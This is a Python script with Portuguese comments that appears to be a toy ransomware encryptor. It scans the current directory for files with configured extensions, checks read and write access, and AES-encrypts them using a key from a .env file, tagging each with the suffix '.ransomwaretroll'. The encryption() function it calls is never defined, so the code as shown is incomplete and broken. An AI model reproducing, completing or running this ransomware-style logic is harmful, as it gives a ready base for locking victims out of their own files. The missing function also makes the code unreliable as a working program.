import os
from time import sleep
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from dotenv import load_dotenv
from tqdm import tqdm

def log(message, level="info"):
  """
  Loga as menssagens no console com seus respectivos simbolos de acordo com o level.

  :param message: Menssagem a ser exibida.
  :param level: Nivel  da mensagem (info, success, error, processing).
  """

  symbols = {
    "info": "[ i ]",
    "success": "[ ✓ ]",
    "done": "[ + ]",
    "error": "[ × ]",
    "processing": "[ ~ ]",
  }
  print(f"\n{symbols.get(level, '[ ? ]')} {message}")
  # Atraso de 0.5s para prosseguir
  sleep(0.5) 


def list_files(directory, valid_extensions):
  """
  Lista os arquivos no diretorio com as extenções válidas especificadas em .env.

  :param dir: Caminho do diretorio a ser definido.
  :param valid_extensions: Lista de extenções de arquivos válidos.
  :return Lista de caminho completos dos arquivos encontrados.
  """

  files = []
  if not os.path.exists(directory):
    log(f"The directory '{directory}' does not exist.", level="error")
    return files
  
  log(f"Processing files in directory: {directory}", level="processing")

  valid_extensions = [ext if ext.startswith('.') else f".{ext}" for ext in valid_extensions]

  for file in os.listdir(directory):
    file_path = os.path.join(directory, file)
    if os.path.isfile(file_path):
      extension = os.path.splitext(file)[-1]
      if extension in valid_extensions:
        files.append(file)

  if not files:
    log(f"No files with {valid_extensions} extension found.", level="info")
  else:
    for file in files:
      log(f"File found: {os.path.basename(file)}", level="done")

  return files


def check_permissions(path):
  """
  Verifica as permissoes de leitura, escrita e execução de um caminho (arquivo ou diretorio).

  :param path: Caminho para verificar permissoes.
  :return: True se todas as permissoes necessárias existirem, False caso contrário.
  """

  permissions = {
    "readable": os.access(path, os.R_OK),
    "writable": os.access(path, os.W_OK),
  }
  
  # Retorna True se leitura e escrita forem permitidas para o usuario atual
  return permissions["readable"] and permissions["writable"]


def encrypt_files(directory, crypto_key, suffix, valid_extensions):
  """
  Criptografa todos os arquivos no diretorio atual com o sufixo especificado.

  :param dir: Caminho do diretorio a ser definido.
  :param crypto_key: Chave para criptografar.
  :param suffix: Sufixo para adicionar ao final do nome do arquivo a ser criptografado.
  :param valid_extensions: Lista de extenções de arquivos válidos.
  """

  files = list_files(directory, valid_extensions)

  if not files:
    log("No files found to encrypt.", level="info")
    return
  
  log("Processing file encryption:", level="processing")
  for file in tqdm(files, desc="Encrypting files"):
    file_path = os.path.join(directory, file)

    if check_permissions(file_path):
      encryption(file, crypto_key, suffix)
    else:
      log(f"Skipping file due to insufficient permissions: {file}", level="error")
  
  log(f"All files have been successfully encrypted.", level="success")
  

def main():
  """
  Script principal para carregar as configurações e iniciar o processo da criptografia dos arquivos.
  """
  
  load_dotenv()

  try:
    crypto_key = os.getenv('CRYPTO_KEY')
    if not crypto_key or len(crypto_key) not  in [16, 24, 32]:
      raise ValueError("'CRYPTO_KEY' must be between 16, 24 or 32 characters.")
    
    crypto_key = bytes(crypto_key.encode())
    suffix = os.getenv('SUFFIX', '.ransomwaretroll')
    valid_extensions = [ext.lstrip('.') for ext in os.getenv('VALID_EXTENSIONS', '.txt,.pdf').split(',')]

    directory = os.getcwd() ## Diretorio atual
    # Criptografar arquivos no diretorio
    encrypt_files(directory, crypto_key, suffix, valid_extensions)
  except Exception as e:
    log(f"Execution or configuration error: {e.__class__.__name__} - {e}", level="error")
if __name__ == "__main__":
  print("\n{:=^65}".format(" Starting encrypting "))
  main()
  print("\n{:=^65}".format(" Finishead "))
